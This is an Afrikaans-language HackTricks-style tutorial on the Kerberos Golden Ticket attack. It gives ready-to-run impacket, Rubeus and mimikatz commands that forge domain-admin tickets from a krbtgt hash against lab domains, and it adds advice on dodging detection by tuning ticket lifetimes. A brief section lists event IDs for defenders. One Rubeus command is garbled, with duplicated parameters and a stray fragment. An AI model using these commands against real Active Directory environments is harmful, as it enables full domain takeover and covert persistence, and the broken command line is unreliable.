# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

'n **Golden Ticket** aanval bestaan uit die **skepping van 'n legitieme Ticket Granting Ticket (TGT) wat enige gebruiker naboots** deur die gebruik van die **NTLM-hash van die Active Directory (AD) krbtgt rekening**. Hierdie tegniek is veral voordelig omdat dit **toegang tot enige diens of masjien** binne die domein as die nabootste gebruiker moontlik maak. Dit is belangrik om te onthou dat die **krbtgt rekening se akteer nooit outomaties opgedateer word**.

Om die **NTLM-hash** van die krbtgt rekening te **verkry**, kan verskeie metodes gebruik word. Dit kan onttrek word uit die **Local Security Authority Subsystem Service (LSASS) proses** of die **NT Directory Services (NTDS.dit) lêer** wat op enige Domeinbeheerder (DC) binne die domein geleë is. Verder is **die uitvoering van 'n DCsync aanval** 'n ander strategie om hierdie NTLM-hash te verkry, wat uitgevoer kan word met behulp van gereedskap soos die **lsadump::dcsync module** in Mimikatz of die **secretsdump.py script** deur Impacket. Dit is belangrik om te beklemtoon dat om hierdie operasies uit te voer, **domein admin regte of 'n soortgelyke vlak van toegang gewoonlik vereis word**.

Alhoewel die NTLM-hash as 'n lewensvatbare metode vir hierdie doel dien, word dit **sterk aanbeveel** om **kaartjies te vervals met die Advanced Encryption Standard (AES) Kerberos sleutels (AES128 en AES256)** vir operasionele sekuriteitsredes.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe asktgt /user:Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

/rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /ptt
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
**Sodra** jy die **goue kaart** ingespuit het, kan jy toegang verkry tot die gedeelde lêers **(C$)**, en dienste en WMI uitvoer, sodat jy **psexec** of **wmiexec** kan gebruik om 'n shell te verkry (dit lyk of jy nie 'n shell via winrm kan kry nie).

### Om algemene opsporings te omseil

Die mees algemene maniere om 'n goue kaart op te spoor, is deur **Kerberos-verkeer** op die draad te inspekteer. Standaard **teken Mimikatz die TGT vir 10 jaar**, wat as anomaal sal uitstaan in daaropvolgende TGS-versoeke wat daarmee gemaak word.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Gebruik die `/startoffset`, `/endin` en `/renewmax` parameters om die beginoffset, duur en die maksimum hernuigings te beheer (alles in minute).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Ongelukkig word die TGT se leeftyd nie in 4769's gelog nie, so jy sal hierdie inligting nie in die Windows gebeurtenislogs vind nie. Wat jy egter kan korreleer, is **om 4769's te sien sonder 'n vorige 4768**. Dit is **nie moontlik om 'n TGS aan te vra sonder 'n TGT nie**, en as daar geen rekord van 'n TGT wat uitgereik is nie, kan ons aflei dat dit offline vervals is.

Om **hierdie opsporing te omseil**, kyk na die diamond tickets:

{{#ref}}
diamond-ticket.md
{{#endref}}

### Versagting

- 4624: Rekening Aanmelding
- 4672: Admin Aanmelding
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Ander klein truuks wat verdedigers kan doen, is **om te waarsku oor 4769's vir sensitiewe gebruikers** soos die standaard domein administrateur rekening.

## Verwysings

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{{#include ../../banners/hacktricks-training.md}}
